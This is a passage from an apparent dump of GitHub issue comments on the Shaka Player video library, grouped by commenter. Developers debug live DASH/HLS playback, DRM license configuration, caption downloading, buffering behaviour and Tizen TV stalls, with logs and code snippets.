team, and check with them if they have more questions. If not it will be ok to close the item.. Hi @ismena,\nThe packager team agree with your analysis, and we made the modifications proposed.\nWe modified:\n- Period@start fixed, but not 0 for the moment.\n- PresentationTimeOffset is so calculated relatively to it.\n- suggestedPresentationDelay is set 30 seconds.\nBut to be honest, it's not ok for the moment : When we make the player.load action, the playback doesn't start imediately :-(. We have to click on the Play button of the Player, and to move the cursor on the seek bar to make it start! However when started, it doesn't interrupt anymore :-).\nMaybe you have an idea? As it's not the same symptom as previously, if you prefer us to close this issue we can. And if we don't solve it in our side, I could open another one to get your help. What do you prefer?. Hi @shakateam,\nDespite our attempts, we are still unable to playback the stream.\nWe tested with 2.3.0 version, 2.3.3 version, and the last 2.3.4 version.\nWe tried with 2.2.2 version too, and it works. Curiously, from 2.2.3 version we have the same comportment.\nCan you please help us a last time?\nThanks in advance.. Hi. It seems to work! I'm currently out of office, but I'll try to test with longer sessions, and make you a feedback when I'm back.. OK, thanks for your help.. @shaka-bot reopen\nNew tests done with 2.3.5 version.\n- The playback start is now ok, and is not interrupted anymore during a certain duration.\n- But, after about 40 minutes, the playback stops.\nIn the log, we can see there is is an infinite loop:\n 09:46:18.402 dash_parser.js:1186 Updating manifest...\n 09:46:18.425 streaming_engine.js:1133 (audio:6) timeNeeded=1522827918.1069446\n 09:46:18.426 streaming_engine.js:1144 (audio:6) update_: playheadTime=1522827917.649721 bufferedAhead=0.45722317695617676\n 09:46:18.427 streaming_engine.js:1295 (audio:6) next position known: position=2171\n 09:46:18.427 streaming_engine.js:1395 (audio:6) segment does not exist: currentPeriod.startTime=1522824320.072 position=2171\n 09:46:18.428 streaming_engine.js:2167 (audio:6) updating in 1 seconds\n 09:46:18.520 presentation_timeline.js:211 notifyNewSegmentDuration: maxSegmentDuration=2.2\n 09:46:18.520 dash_parser.js:1235 actual update period 3\n 09:46:19.314 streaming_engine.js:1133 (video:3) timeNeeded=1522827918.072\n 09:46:19.315 streaming_engine.js:1144 (video:3) update_: playheadTime=1522827917.649721 bufferedAhead=0.34227919578552246\n09:46:19.316 streaming_engine.js:1295 (video:3) next position known: position=2171\n...\nFor security reasons, the previous streams are now closed.\nHere is a new one: http://195.36.159.232/testccast/bxu/manifest.mpd\n. Hi @Jacob, and thank you.\nYou confirm so you can reproduce it after about 40 minutes of playback?\nSo, what is the best thing to do according to you? Should we define an explicit period duration (does it make sense for Live streams?) or should we fixed the gap between periods? Or both?\n. Hi @TheModMaker. I'm surprised by the fact that there were 2 periods in the same manifest with our current Packager configuration, and as it's a clear DASH stream. I suspect there was a problem during your first test, such as for example a temporary flow loss by packager.\nAnyway, thanks again for your help, and for the enhancement proposal.. Hi,\nIn all my tests I didn't find the > missing in XML, but I'm trying. Please let me until next week to make you a definitive feedback.. Finally I think I got it. It'is rather the / character that is badly place when the track is empty:\nNot empty case:\n\n...\n...\n\nEmpty case:\n\n\n\nI'll open an issue, and I close the case now. Thanks again.. Hi, and thank you very much for your answer.\nIn my case, the adaptations that contains a representation with same IDs are describing subtitles of different languages. \nLet me know if from your point of view it's something eligible to a new Shaka feature, or just an issue to be corrected in my side. Thanks in advance.\nExample: With this, Shaka raise the critical error \"Duplicated_representation_id\"\n\n. Hi. Thanks again foir you answer. I sent a notification of the problem to the packager team.\nThe question is closed.. ",
    "jamescahall": "Yes thanks.  That solves it.  Greatly appreciated.\n\nOn May 15, 2017, at 5:23 PM, Joey Parrish notifications@github.com wrote:\nEME requires https starting in Chrome 58. Chrome makes an exception for localhost, since that is considered a \"secure context\". For more information, see #736 (comment) https://github.com/google/shaka-player/issues/736#issuecomment-289104405\nDoes this help?\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub https://github.com/google/shaka-player/issues/803#issuecomment-301640584, or mute the thread https://github.com/notifications/unsubscribe-auth/ABBds60tRsChhuTQbPK5hj_ADDwgXmzvks5r6OyEgaJpZM4Nb2WZ.\n\n\n. NOTE:  The isBrowserSupported check returns true. Sorry.  Not Blink.  Presto.\nHere is a user agent (the most common browser used for smart TVs in 2015 and 2016).\nOpera 9.80 (linux armv7l) Presto/2.12.362 version/12.11. Btw, If I stub the following in my app code to get past this:\nMediaSource.isTypeSupported = function() {\n    return true;\n}\nI then get back to a 6001 error (which I know is not the HTTPS issue in this case).  I'm supplying com.widevine.alpha and com.microsoft.playready license URLs.  I know the device does support PlayReady.  \nOn another TV running Presto 2.12.407, I don't get the 6001 error but then get a:\nthis.target.addEventListener is not a function error. adding manually to each flavor:\n,CODECS=\"avc1.42E01E\"\nDoesn't appear to solve the issue.\nExample flavor m3u8 it links to has:\nEXTM3U\nEXT-X-TARGETDURATION:10\nEXT-X-ALLOW-CACHE:YES\nEXT-X-PLAYLIST-TYPE:VOD\nEXT-X-VERSION:3\nEXT-X-MEDIA-SEQUENCE:1\nEXTINF:2.000,\nLINK_TO_TS_FILE HERE\n. I can't provide a link here for security reasons.  I can send you one if you have a private method to do so.  As for your comment on TS, it is supported by those you listed but also by Chrome and nearly every TV that runs an HTML5 based browser (including Opera and Firefox OS).  It is the most common format used for HLS delivery so if HLS is supported, TS should be as well.  \nAs for the CODECs information, the HLS specification lists it as a SHOULD include not a MUST include.  See here:\nhttps://tools.ietf.org/html/draft-pantos-http-live-streaming-22\nEvery EXT-X-STREAM-INF tag SHOULD include a CODECS attribute\nI've been working on HLS streams for 6+ years now and frequently they do not contain the CODEC value for video streams using the standard avc1.42E01E encoding.. TS in a HLS m3u8 manifest plays perfectly in Chrome and I test with it on a daily basis and have been doing so for many years.  Why MediaSource says otherwise I don't know.  I'll send an example to your email.\n\nOn May 16, 2017, at 6:32 AM, Joey Parrish notifications@github.com wrote:\nYou can find my email address in the CONTRIBUTORS file to send me a link privately.\nContrary to what you are saying about TS, it is not supported in Chrome. You can see the results of a MediaSource probe by visiting https://shaka-player-demo.appspot.com/support.html in the browser of your choice. In Chrome, for example, you'll see this line:\n\"video/mp2t; codecs=\\\"avc1.42E01E\\\"\": false,\nWhen queried for MPEG 2 TS support, Chrome reports that it is not supported.\nWhile MP4 is supported by every major browser (Chrome, Firefox, Edge, IE11, Safari, Opera, Chromecast), you will find that TS support is much more limited (Edge, IE11, Safari, Chromecast). I do not have any data on TV platforms.\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub, or mute the thread.\n. Hi Joey,\n\nI retract my statement about Chrome.  I had forgotten I have had a fallback format for Chrome all this time.  Sent you an example m3u8 though by email that is a very common format and what is typically used by iOS / Android / Smart TVs.  Our primary use case is Smart TVs so right now we have to toggle between ShakaPlayer and the standard HTML5 video player to use non-protected HLS in this format.\nThanks\nJames\n. In regards to TVs, HLS with TS is supported by 99%+ of Smart TVs and I have tested this extensively since 2012 in actual implementations on:\nSamsung\no Sharp\no Sony\no Hisense\no Western Digital\no Foxxum\no Netrange\no TiVo\no Vizio\no Freetime\no Vestel\no Metz\no Medion\no Aldisued\no Seiki\no Westinghouse\no Element\no Panasonic\no Mstar Chips\no Philips\no Prodea\no Blaupunkt\no Haier\no Medion\no Orion\no TCL\no Sanyo\no Expressluck\no JTC\no Eternity\no Arris Cable Boxes\no Firefox OS. It doesn\u2019t appear to work as you describe.  I\u2019ve tested on Safari which supports TS and even when I manually add CODECS to get past that error, the m3u8 file will not play with ShakaPlayer.  The player doesn\u2019t throw any errors in that case but I just get a black screen.  Trying to manually force play has no affect.\n. Sorry but I am unable to confirm that as I do not have a windows computer to test on.. Ok thanks Joey.  Makes sense and I think your plan would make these playable.\n. Confirmed the error is gone.  Unfortunately typical HLS is till not running in Safari due to the TS bug.. The use case is using the same player for the main video as pre-roll, mid-roll, and post-roll MP4 video ads.  Having to switch players complicates things.  If the ShakaPlayer can support it, why prevent it?. Ok.  This is essentially what we are doing already for our project with this integration to ensure support for devices that ShakaPlayer does not run well on.  My comment was more in the vein of creating a fully inclusive player that a developer could use for any task.  Typically ads are coming in via VAST and require a bunch of extra tracking mechanisms and will arrive in whatever format the ad provider provides (typically MP4).  Ad stitching would require the ShakaPlayer to support VAST solely in itself and keep track of ad tracking ping backs as it is played.  Handling this server side causes black listing in many cases from Google DFP and others.\n. Great to hear. Thank you.\nRegards,\nJames Cahall\n\nOn Aug 28, 2017, at 11:50 PM, Joey Parrish notifications@github.com wrote:\nWe've decided to work on src= support in v2.3. This will involve a fair amount of refactoring, and using src= to directly play a media file will mean that most of Shaka Player's configuration will have no effect. The browser will be responsible for streaming, buffering, etc. Side-loaded captions would also fail (because we would not be streaming text, either). Shaka Player would only be able to control DRM for src= playback.\nSo, with all those caveats, we are scheduling this for v2.3.\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub, or mute the thread.\n. \n",
    "fgutierrezw": "@TheModMaker thanks for the answer.\nI will setup a few streams and sent them to you.\nI haven\u00b4t seen any VIDEO_ERROR, also with a fresh manifest shaka 2.x.x is able to play and decode. So i use a the wrong term, i think it\u00b4s more related to a playback problems, the client downloads the manifest, a few chunks but it never start to play the content (updated title of the issue).\nI will recollect the other info that you request and i will put it in another post.. output from chrome://media-internals\nrender_id: 3930\nplayer_id: 7\npipeline_state: kSeeking\nevent: WEBMEDIAPLAYER_CREATED\nurl: blob:http://192.168.0.3/baa864c8-f5bf-41ad-834f-b9bedcbc095e\nduration: 4294967296\nfound_audio_stream: true\naudio_codec_name: aac\nfound_video_stream: true\nvideo_codec_name: h264\naudio_dds: false\naudio_decoder: FFmpegAudioDecoder\ndebug: Video rendering in low delay mode.\nvideo_dds: false\nvideo_decoder: GpuVideoDecoder\n. @TheModMaker indeed, it is a bug on an specific version (the one that i have :)) caused when there is  a PTS wraparound. From that moment the out of sync between manifest and chunks appears.\nThanks for the help.. ",
    "kuznetcoff777": "@joeyparrish Hi! Can you explain logic of player for current time detection of segment that is playing (live stream). In a code i see this\n```\nshaka.Player.prototype.getPlayheadTimeAsDate = function() {\nif (!this.manifest_) return null;\ngoog.asserts.assert(this.isLive(),\n  'getPlayheadTimeInUTC should be called on a live stream!');\n\nvar time =\n  this.manifest_.presentationTimeline.getPresentationStartTime() * 1000 +\n\n  this.video_.currentTime * 1000;\n\nreturn new Date(time);\n};\n```\nAm i correctly understand that current time = availabilityStartTime + some shift (that is taken from segment)?\nWhy player does not look at absolute time code that is should be in each segment?. @joeyparrish \n\nis this related to the original issue in this thread?\n\nNot at all... just wondering and trying to understand why player does not take absolute time from metadata of video chunks, is it even possible?. Hi! When 2.2 version will be available?\nWe did some workarond with mainfest file and now it looks like this:\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n```\nBut anyway we dont see captions (only see as they are downloaded). Moreover i see that captions are downloaded even whtn CC button is unpressed. I think it is not properly.. Here is MPD example:\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n```. @joeyparrish what is \"needs triage\"? Should i provide more info?. \"Can you give us a playable manifest?\" not at the moment, it is secured with CORS\n\" Though I do see that you don't have any clock synchronization in the manifest.\" - we made a fallback to clockSyncUri\n\"When you say the difference is changing, is this for a single playback session, or are you reloading the page on the next day and seeing a larger difference?\" - not single playback session\n\"You mention getPlayheadTimeAsDate, are you using that to determine the difference between the client and the server?\" -as i understand shaka player use it by default\n\"Or are you looking at the burned in time on the client vs the current wall clock time?\" - dont get the question\n\"If you play this stream on different browsers or machines, do you see the same behavior?\" - the same behaviour on different browsers\nHow to make shaka player to determine current time playing from metadata of video segments?\n. \nHere is how it looks in player at the moment of 18 days stream uptime.\nBlack time - is burned in stream time of server, that packages dash, white time - is player time.\n. \"What metadata are you talking about for detecting the current time?\" - time code, that is inserted/embeded in video segment (as i said i checked with Sencore \nI sent mpd link at shaka-player-issues@google.com\nI have just restared stream, so you can see initial -20 seconds shift.. Did you manage to check?. \"When I play live at the live edge, I see a delay (compared to my local clock) of almost exactly 1 minute. \" - dont look at your local time of your machine, it is not so interesting. Anyway we dont use localtime of users, we look at clockSyncUri http://time.akamai.com/?iso\n\" I also notice the 20 second difference between the burned-in time vs getPlayheadTimeAsDate, but I don't know if it is changing.\" - it is changing, 3 days pased and ~1 second shifted already. Few days more and it will be more. Try in a 3 days, you will see ~2 seconds difference\n\" My guess is that your encoder is burning in the wrong time.\" - it is not true, i already explained how i checked it by comparing with schedules we have.\n\". Or the clock on your encoder's machine is different than your machine, which is causing the differences.\" -as i said we dont use local time of user.\n. I have to admit that this trick did not work, sorry for inconveniences. This test stream is made without audio and captions. Maybe this is the reason of not shifting stream. So i will investigate with encoder.\nThe last question, anyway, am i correctly understand that player does not take time metadata from video segments and just do calculate time from MPD file? And no other way to make player to take into account this time metadata?. Yep, it seems to be encoder issue. I suppose we can close the issue.. @TheModMaker \nI have to reopen ticket. You say that manifest time is used for approximation, but here is my example. I launch stream and see initial difference of 20 seconds between burn-in timecode and player time.\n\nAfter that i changed availabilityStartTime for 4 seconds back, so player time shift back for 4 seconds also\n\nso now difference between burn-in timecode and player time is 16 seconds.\nThis code is used to get player time\nvideo.addEventListener('timeupdate', function () {\n        time.innerHTML = player.getPlayheadTimeAsDate()\n    });\nSo that means that shaka uses availabilityStartTime. It does not correlate with your words, that player takes time from metadata of video segments. Or i do something wrong and use not right function for getting time?\n. Update \nvideo.currentTime - gives me \n416.735416\nIt seems to be that it is time from the start of stream. And it is not real timecode, that is inserted in metadata of video segments (\n\n. Given that this DASH service uses H.264 video the timecode information is bundled in the pic_timing info which is carried in the SEI_RBSP within the video itself. Can you please confirm that shaka player takes info about timecode from  SEI_RBSP? (Becuase we think that SEI_RBSP is not used by shaka player to determine timecode). @vaage Then i dont get why TheModMaker says one thing and you another. \nAnyway how can we make player time to be taken from metadata of video segments? We faced the problem when timecode due to input source failures/drops resyncs (after some threshold, in our case 25 frames) with input timecode so it leads to changes of time code in video segments (in our case it goes back). But this changes are not reflected in mpd file, because if packager change availabilityStartTime then after a while player will try to fetch segments that are not even generated. So it is not right that player try to show stream time based on availabilityStartTime.\nWe use hds streaming now and flash player read time code info from video segments. So if input failres/drops happen, then it anyway does not lead to not correct player time.\n. \"you want us to avoid buffering more audio than we have already buffered for video. Is that correct?\" - correct\n\"Do you expect us to wait until a video segment is buffered before fetching the corresponding audio segment? Or fetch them simultaneously?\" - both methods wiil be ok, because at the moment available bandwith is used for downloading future audio-captions, but this bandwith could be used to download necessary video segment:. So, is it possible?. @joeyparrish Thanks!. It seems to be that live content is stale, i can leave mpd for today if you want, but after i should relaunch it.. I managed to do content alive, but it still can not be played in shaka player. Approving, when player is paused on live conent, it still downloads video segmetns to update images. It is bug, i suppose, user downloads segments when it is not necessary.. @joeyparrish, please answer us. \"But perhaps we should consider an exception where if paused and outside the seek range, we stop buffering.\" - what if there will be long DVR, for exampe 24 hours? It will still download for 24 hours. I propose to dome some configurable parameter, that configures x seconds timeout after which not to download new segments after x seconds of being paused.. O, thats fine. We got 2.2.4 version and timeShiftBufferDepth=\"PT299.50S\"\nWhen paused, and more then 5 minutes passed player still try to be up to date and download segments (but not refreshing picture). How to stop player fetch segments?. One thing i cannot understand, encoder makes stream in unstopable way (if some drift happens then it will not make segment less or more by time (for example if drift one second back, then segment will be any way for 5 seconds as configured))\nIn HLS there is a timestamp can be shown explicitly via #EXT-X-PROGRAM-DATE-TIME for every 5 seconds (when ts segments for 5 seconds for example) and if drift happens then this tag can be changed and player will use correct time. \nIn DASH if template is used, then i dont get how player will know that drift happened if segmetns still the same length in seconds? I thought that multi-period should help in this case.. For example while changing resolution of player. If small player, then download only SD profiles, if huge player, then download all up to HD profiles. One more important thing i want to notice, if maxBandwidth changed (for example player changed to hires), then player download hd segemtns (while palyer still have SD buffer) so player stalls for a couple of seconds. It irritates. It is good from the point of quality of picture, but bad from point of player stalls. I think it will be good to have some parameter, for if it is true then player downloads new segments, if false, then player should play its previous buffer and only after that goes to another resolution.. @TheModMaker So do i need to open new issue?. Thanks! It works!. Second mdat is seems to be invalid, i attempted to cut it, but no luck, error 3000 was faced. \nIs there any way to make a hot fix on 2.2 version by ourself? We cannot wait for 2.3 version.... Maybe label is enhancement?\nThanks a lot, it works now.. @theodab @joeyparrish \nGuys, have not you destroyed fix in 2.3.0? We checked new version and it seems to be does not work, if button cc is pressed, then captions are not downloaded. Hi! Any success?. Maybe it is necessary to make some configurable parameter, some delta, for example if it = 60, then if now_date - publishtime>60, then error. M?. Guys, it is pretty critical thing, cause now our player have main and backup playlist, and if main playlist stalls, player cannot turn to backup, because of it does not get that something wrong with main playlist.. With great pleasure, but i do not know your code as well as you are and it will teke more time. I just wanted to know if any thoughts appeared, last thing was your question. I think it must be configurable, because:\n1-publish time is constant when it is VOD\n2-i saw some encoders, which do not refresh publish time (or refreshes very seldom). \" In your scenario, you would buffer ahead a minimum of 10 seconds. If the number falls to 9.9999..., we would fetch another segment. \" \nIf the number falls to 9.9999 - do you mean if segment size changed from 10 seconds to 9.9999?\nAnyway i dont get what buffergoal is doing in our case? We attempted to change it to 100, but still no change, bufferered about 30 seconds ahead, it seems to that in live content some other rule persist.. So buffer ahead is only configurable via suggested presentation delay, right? Negative side of it - is that we go far from live, as i understand.\nSo i still dont get why presentation delay is 20 sec, but we can buffer up to 30 seconds, is it related to your words about 9.9999?. One thing i also cannot understand. What if we have big timeShiftBufferDepth and we paused for several minutes. What time will player buffer ahead? Still the same supposed suggested presentation delay?. The same issue i got on demo app.\nMy config is \nstreaming:\nbufferBehind:30\nbufferingGoal:10\nfailureCallback:\u0192 ()\nignoreTextStreamFailures:false\njumpLargeGaps:false\nrebufferingGoal:2\nretryParameters:{maxAttempts: 2, baseDelay: 1000, backoffFactor: 2, fuzzFactor: 0.5, timeout: 0}\nsmallGapLimit:0.5\nstartAtSegmentBoundary:true\nSo it seems to I made wrong conclusion from #1051.\nSo now as i understand - when we watch very live content - only suggested presentation delay is active, so player can fetch only that segments which is in presentation delay time (maybe +1 segment)\nBut when we paused (and buffer depth is huge) for a couple of minutes, if only buffering goal is active in this case? If we configure buffering goal = 10 seconds, then player can fetch bufferingGoal + 1 segment.\nIf everyting i described correctly?. \"Since subtitles consume so little bandwidth we feel that this minor cost in bandwidth usage is a minor price to pay for user experience.\" - yes, from user side it is not so bad situation. But from streamer side...\nI want to mention that in DASH there is a good decision was made to divide init.mp4 and mp4. Init file in our case is about 1KB, not so big, but in long-term perspective it is economy of traffic. In our case caption file minimum size is 32KB. So, for example, if we have 100000 of users that dont need captions and they watch stream for 1 hour (10sec fragments) - we get excess traffic ((32/1024)100000 60 *60/10) = 1125000MB = 1,125TB - too huge\nMoreover we get excess req/s for edge servers.\n\" If we did not do this, they would have to wait for the subtitles to be available.\" - i suppose it is not so worse situation if user will wait a little for new subs. Or it will be good if if cc button pressed then caption must be downloaded immediately and showed to user.\nOtherwise I propose to make configurable parameter - by default player fetches captions as you described, and if it is off, then player start to fetch captions only after CC button is pressed.. I suppose it is readonable, isnt it?. \"you have a minimum caption file size of 32kB? Why is this a minimum? Where does this limitation come from?\" It is not a limitation, i just watched directory where fragments are situated and found mimimum size of our 10-sec caption fragments.\n\"We don't want anyone to waste 11 MB per person per hour on unused subs, so I will schedule this enhancement for the current milestone. Thank you for being patient with us while we try to understand the problem better.\" - it will be perfect, thanks!. @joeyparrish \nOpened stream https://nightly-dot-shaka-player-demo.appspot.com/demo/#asset=//storage.googleapis.com/shaka-demo-assets/sintel-mp4-wvtt/dash.mpd;lang=ru\nBut when button is unpressed it still fetches subtitles, screenshot is attached\n\n. @joeyparrish  @michellezhuogg \nGuys, reopen ticket, problem is not solved!!!. \"If you want to buffer less, you'll need to change the configuration.\" - no, i need exact 30 seconds of buffer and stalled player only if minBufferTime left in buffer. So what function of minBufferTime then?\n\"Player fetches 30-35 seconds ahead (for example player time is 12:00:00, i see that last downloaded segment Last-Modified field is 12:00:30 - so last segment is for 12:00:25-12:00:30)\" - i cheked by Last-Modified of video segments, not by video.buffered - next time i will check it, but i sure it will be the same.\nIf you enable logging, do you see logs about large gaps? - i will check\n\"My guess is that we have buffered 15 seconds of audio, but not enough video, so we stall when the video runs out.\" - nope, i cheked on video segments.. Guys, hi! Will it be fixed in 2.3.0?. Confirm, thanks!. In nightly version it works properly, what stable version will it be and when it will be available?. @TheModMaker \nHi. Am i correctly understand that in 2.3.1 this issue was not fixed? When will it be fixed then?. Sorry, my fault, everything is ok. @TheModMaker \nThat what i just thought about while reading your firsrt sentences - about another mainfest with video only. \nThanks for idea!. Thanks for explanation!. Yes, it seems to be this is it! It is great that you refactoring player!\nIm attempting to resolve it via multi-period at the moment, but no luck at the moment.\nWhen approximately this solution will be ready at your side?. Thanks, waiting for enhancement!. ",
    "aleian84": "\n. var serverLicenseFile = 'https://' + location.host + '/license.bin';              // This is a license file that we\u2019ve downloaded from https://storage.googleapis.com/wvdocs/wv-proxy-sample.tgz\n$.ajax({\nurl: serverLicenseFile,\n    success : function(response){\n  function str2ab(str) {          // function to get a Unit8Array\n     var buf = new ArrayBuffer(str.length*2);\n     var bufView = new Uint8Array(buf);\n\n     return bufView;\n  }\n\n  var serverCertificate = str2ab(response);\n\n  self.player.configure({\n     'preferredAudioLanguage': self.getDefaultAudioStream(),\n     manifest: {\n                    dash: {\n                        clockSyncUri: dateSync\n                    }\n     },\n     abr: {\n        manager: abrManager\n     },\n     drm: {\n        servers: {\n            'com.widevine.alpha': URL_API[\"GetWidevineExternalKey\"]+\"&channel=STBTIVUON&cp_id=\"+self.currentContent.variant.cp_id\n        },\n        advanced: {\n            'com.widevine.alpha': {\n                  serverCertificate: serverCertificate, // for Chrome 59\n                  'videoRobustness': 'SW_SECURE_CRYPTO',\n                  'audioRobustness': 'SW_SECURE_CRYPTO'\n            }\n        }\n     }\n  });\n\n  self.load(mediaUrl);\n},\n\nerror : function(error){\n    console.log(error);\n}\n\n});\n . I have tried to send a ZIP file but an error occurs. You can find in first comment the png of the error and in the second comment our code. \nThank you \nAlessio. Hi guys,\nthank you for support. Now we implement following code but we have the same issue ( 6004 ). Can u help me to understand why?\n\n. Widevine provides the bin file from here : https://www.widevine.com/product_news.html\nI download it from here : https://storage.googleapis.com/wvdownload/cert_license_widevine.tgz \nI unzip the tgz and I put the bin file on our apache server.\nThanks,\nLet we know,\nAlessio. Hi Joey,\nwe follow your suggestion and put the file on our server. \nNow we are able to play content with serverCertificate enabled.\nThank you for your support :+1: \n. Hi Joey, yes I am the developer. Can I send to you the credentials in a private message? Can you send to me your account email?\n@cpeterso : attached you can find two request body from Infinity PROD for the same content with the same user, one with FF54, the other with FF55.\nA diff between the two body:\n\nIn FF54: \u201carchitecture_name x86-32\u201d in FF55: \u201carchitecture_name x86-64\u201d\nIn both: \u201cwidevine_cdm_version             1.4.8.9032\u201d\nIn FF54 there is a final \u201cnull\u201d in FF55 there is some bytes instead of null\n\nHope this help.\n. PayloadGetWidevineFF55.txt\nPayloadGetWidevineFF54.txt\n. @Joey I've sent to you an email with the credentials.\nThank you for the support,\nAlessio. Hi Joey, thank you for your analysis, it is very useful. Yes, I'm available to work with @cpeterso. @joeyparrish could you give the credentials that I've sent on private email to @cpeterso?. Thank you @joeyparrish. \nI'm thinking to resolve the issue on my website (until Firefox doesn't work) forcing video.play() from my code only for version 55 of Firefox (if I'm able to recognize it). What do you think? It's the correct approach?. Perfect Joey, I will follow this approach.\nThank you again, you're the best.\nAlessio. ",
    "kevinscroggins-youi": "@joeyparrish Any updates on this front? In my experience Samsung generally has no plans to fix issues on older platforms, so this will probably remain as an indefinite issue. I am also experiencing PlayReady DRM playback failures on a 2016 Tizen TV and this issue seems to be directly related. Non-DRM streams work fine. It would be nice to have the option to have some sort of work-around to getting this working, even in spite of the consequences!. @chrisfillmore Totally understandable, I will probably give this a shot as we would like to try and support 2016 TVs as well if there is a possibility of a workaround. Thank you for the follow up!. I spent some time experimenting with getting DASH w/ PlayReady DRM to work on a Tizen 2016 TV with no luck. I managed to get Shaka to ignore duplicate initialization data but it seems like the entire application execution locks up whenever it tries to retrieve the actual video stream from the content server based on the logs. Despite the polyfills for EME 0.1b to support the Toshiba TV, the draft version of EME 0.1b that is present on the 2016 (and 2015) Tizen TVs is different and seemingly entirely non-functional. I believe the only way to get any DRM encrypted content to play on this TV is through the use of embedded PlayReady object data in the manifest. I know this is the case with the standard Tizen AVPlay API and NaCl C++ media player interfaces as well (shy of hooking up your own code or library to their elementary streams to handle DRM yourself for the NaCl C++ interface). It may be possible that the 2015/2016 EME works, but without better support from Samsung and actual debugging capabilities, I'm not sure it would be feasible to get this feature to work. It is possible to obtain device logs using a custom serial cable and the factory menus but it mostly contains a ton of useless information. I researched several other HTML5 players as well, and no one else supports DRM on 2016 TVs or lower either.. Hi @joeyparrish, are there any updates on when this feature might be implemented? Thanks!. Thanks for the reply! I definitely do have mux.js.min version 5.0.1 included in my main template. Is there any extra setup that needs to be done to integrate this with Shaka? I did manage to get some tracks to appear in the list with this asset:\nhttps://vm2.dashif.org/dash/vod/testpic_2s/cea608_and_segs.mpd\nBut not any of the aforementioned WebVTT / TTML assets. Is there something I'm overlooking?. Here is a fiddle: https://jsfiddle.net/zyg0bf8m/6/. No worries! Oh, gotcha! I didn't realize that embedded TTML / VTT aren't supported specifically, that makes more sense. Thank you for clarifying!\nThe manifest that I linked in the fiddle should have embedded DASH CEA-608 CCs though, and it works in the demo Shaka player, but not in my code snippet. Any idea why that might be? Is it perhaps because they're subtitles and not closed captions or something? I'm not a DASH expert, so I'm still learning, haha.. Oh, fair enough. Thank you for clarifying that.\nRight, ok. Noted!\nWoops, not sure how I managed that. It loads the page in an iframe, so it should be okay, but points taken! Ahhhh, okay! For my app I have mux.js loading from a local file as well, but it's likely that I switched from 2.5.0-beta2 to 2.4.6. I checked the commit history on Github and it looked like 2.4.6 included all of the 2.5.0-beta2 features and more, but I guess I was mistaken. In that case, do you happen know a rough timeline for the next beta release that includes all of these features? Thank you so much for your help! @TheModMaker . @ismena I did mean that, yes! As far as I understand there's some playback issues and other things that have been fixed with version 2.4.6 so I've opted for that version instead of 2.5.0-beta2 for the moment. That's excellent news though, no worries! Thanks so much again for all the help!. @chrisfillmore That's what I thought, but it still seems to be erroring out. Perhaps I'm not doing it correctly, I did experiment with a few different approaches but didn't have much luck.\n@joeyparrish Thanks for the follow up! Ahh sorry, I must have been mistaken. I'm getting a 6001 error in Chrome now that I try it again. On Tizen I'm definitely still getting a 6012 error despite having only specified the license server for PlayReady and I confirmed that it's erroring on playback because it can't find a license server for Widevine. The documentation also backs up this behaviour by indicating that licensing servers for all DRM types in the manifest must be specified, is this not the case? Here is an example fiddle: https://jsfiddle.net/Ljqa5t3d/1/ I unfortunately don't have a copy of Edge or IE11 on anything > Win7 to test against, since Tizen TVs aren't easy to debug on, but it should be correct. Auth token is also redacted, but shouldn't be required.. After updating my code and testing using Microsoft Edge on Windows 10, this appears to now find the correct license server, but there is a cross-origin error when retrieving the manifest that I was unable to previously see on Tizen. I believe this issue is resolved, and is now a backend server issue. Thanks for the help!. After some more troubleshooting, it looks like I had the incorrect mime type, text/vtt seems to result in the text track loading correctly. Still seems like there might need to be some extra error handling / validation checks for this though? . That's very strange, I don't believe there's any sort of whitelisting. Tried it on a VPN to make sure. The VTT file doesn't actually match the video, so any video asset and closed caption file can be used in its place if that helps. The main issue is that if the mime type is incorrect, there doesn't seem to be any sort of informative error handling. Hope this helps.. @vaage No problem! And yes I'm aware of the mime issue, I discovered that shortly after and left a follow up comment that you might have missed. It does indeed work with the correct mime type of text/vtt, but the error handling for incorrect mime types seems to be missing based on the errors I was seeing.\n@joeyparrish That sounds perfect!. @vaage No problem! That is very strange, I don't get that at all. Perhaps it's geo blocked or something. I'll attach a copy of the HLS manifest data, if that helps? If you need it hosted, let me know and I can see about sorting that out. Thanks!\nmaster.txt. Is there any possibility that you can try to load the stream through a VPN? If you set your VPN location to anywhere in Canada (ideally Quebec or Ontario), it should work. If not, I will see about getting a separate asset to test with. Thanks!. Ahh, that makes sense! I didn't realize it was using an unsupported feature, thank you @chrisfillmore for looking into this!. Related to https://github.com/google/shaka-player/issues/1782. I have also seen video stalls on Tizen TVs with very specific firmware that the normal stall detection handling did not fix. We were able to recover playback by pausing and then trying to play the video again, and as such we ported the stall detection code app-side and changed the stall handling to pause and play the video instead. Sounds similar to what you are seeing, so perhaps it may be of interest to introduce separate handling for stall handling on Tizen versus any other platform that invokes a pause / play on the player, unless there is a better solution.. I have also seen video stalls on Tizen TVs with very specific firmware that the normal stall detection handling did not fix. We were able to recover playback by pausing and then trying to play the video again, and as such we ported the stall detection code app-side and changed the stall handling to pause and play the video instead. Sounds similar to what you are seeing, so perhaps it may be of interest to introduce separate handling for stall handling on Tizen versus any other platform that invokes a pause / play on the player, unless there is a better solution.. Also, you may want to update your ticket as you have listed the TV models instead of the actual firmware information. You will want to go to Settings / Support / About this TV to retrieve this information. :). After further investigation today, we have tracked down the source of the issue, which confirms our initial suspicions that React Native is interfering with the functionality of createObjectURL, as used by Shaka. If we print out the function before injecting React Native, the following is printed to the console:\nfunction () { [native code] }\nAnd after React Native is injected, the function definition for createObjectURL is now:\n```\nfunction createObjectURL(blob) {\n  if (BLOB_URL_PREFIX === null) {\n    throw new Error('Cannot create URL for blob!');\n  }\nreturn \"\" + BLOB_URL_PREFIX + blob.data.blobId + \"?offset=\" + blob.data.offset + \"&size=\" + blob.size;\n}\nWhich originates from [this file](https://github.com/facebook/react-native/blob/e6057095adfdc77ccbbff1c97b1e86b06dae340b/Libraries/Blob/URL.js). The polyfill is then in turn executed [here](https://github.com/facebook/react-native/blob/0.55-stable/Libraries/Core/InitializeCore.js#L130). I suspect that storing a local reference to the original function at the time of including Shaka and executing that instead should help with React Native compatibility and 